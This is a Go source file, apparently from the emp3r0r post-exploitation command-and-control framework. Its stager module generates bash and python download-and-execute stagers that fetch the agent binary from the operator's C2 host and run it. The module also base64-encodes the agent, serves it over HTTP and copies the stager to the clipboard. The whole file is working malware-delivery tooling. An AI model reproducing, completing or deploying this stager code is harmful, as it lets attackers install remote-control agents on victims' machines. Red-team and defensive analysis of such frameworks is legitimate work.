//go:build linux
// +build linux

package cc


import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"strings"

	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

var Stagers = []string{
	// for Linux
	"linux/bash",

	// generic
	"java",
	"php",
	"python",
	"python3",
	"perl",

	// for Windows
	"windows/powershell",
	"windows/c#",
}

// modStager generate a stager (to download the actual agent binary and execute it)
func modStager() {
	chosen_stager := Options["type"].Val
	agent_bin_path := Options["agent_path"].Val
	stager_filename := fmt.Sprintf("%s.%s.stager.bin", agent_bin_path, strings.ReplaceAll(chosen_stager, "/", "-"))
	enc_agent_bin_path := fmt.Sprintf("%s.enc", agent_bin_path)
	var enc_agent_bin_data []byte

	// stop stager HTTP server when needed
	if tun.Stager_Ctx != nil {
		CliPrintInfo("Looks like stager HTTP server is already running on port %s, we will shut it down to serve the new file", RuntimeConfig.HTTPListenerPort)
		tun.Stager_Cancel()
		// shutdown server if needed
		if err = tun.Stager_HTTP_Server.Shutdown(tun.Stager_Ctx); err != nil {
			CliPrintError("Error shutting down stager HTTP server: %v", err)
		}
	}
	tun.Stager_Ctx, tun.Stager_Cancel = context.WithCancel(context.Background())

	url := fmt.Sprintf("http://%s:%s", RuntimeConfig.CCHost, RuntimeConfig.HTTPListenerPort)
	if CliYesNo("Do you want to use the default URL (stager will download from it)") {
		CliPrintInfo("Using default URL %s for agent binary download", url)
	} else {
		CliMsg("You will have to reverse proxy http://localhost:%s to your custom URL", RuntimeConfig.HTTPListenerPort)
		url = CliAsk("Give me an HTTP download URL (stager will try downloading agent from this URL): ", false)
	}

	switch chosen_stager {
	case "linux/bash":
		stager_data := bash_http_b64_download_exec(url)
		err = os.WriteFile(stager_filename, stager_data, 0600)
		if err != nil {
			CliPrintError("Failed to save stager data: %v", err)
			return
		}
		CliPrintSuccess("Stager saved as %s:\n%s",
			stager_filename, color.MagentaString("%s", stager_data))
		CopyToClipboard(stager_data)

		// base64 encode agent binary
		agent_bin_data, err := os.ReadFile(agent_bin_path)
		if err != nil {
			CliPrintError("Read agent binary: %v", err)
			return
		}
		enc_agent_bin_data = []byte(base64.StdEncoding.EncodeToString(agent_bin_data))
		err = os.WriteFile(enc_agent_bin_path, enc_agent_bin_data, 0600)
		if err != nil {
			CliPrintError("Write base64 encoded agent binary: %v", err)
			return
		} else {
			tun.ServeFileHTTP(enc_agent_bin_path, RuntimeConfig.HTTPListenerPort, tun.Stager_Ctx, tun.Stager_Cancel)
		}

		// serve agent binary
	case "python":
		stager_data := python_http_xor_download_exec(agent_bin_path, url)
		err = os.WriteFile(stager_filename, stager_data, 0600)
		if err != nil {
			CliPrintError("Failed to save stager data: %v", err)
			return
		} else {
			CliPrintSuccess("Stager saved as %s:\n%s",
				stager_filename, color.MagentaString("%s", stager_data))
			CopyToClipboard(stager_data)

			// serve agent binary
			tun.ServeFileHTTP(enc_agent_bin_path, RuntimeConfig.HTTPListenerPort, tun.Stager_Ctx, tun.Stager_Cancel)
		}

	case "python3":
	default:
		CliPrintError("%s stager has not been implemented yet", chosen_stager)
	}
}
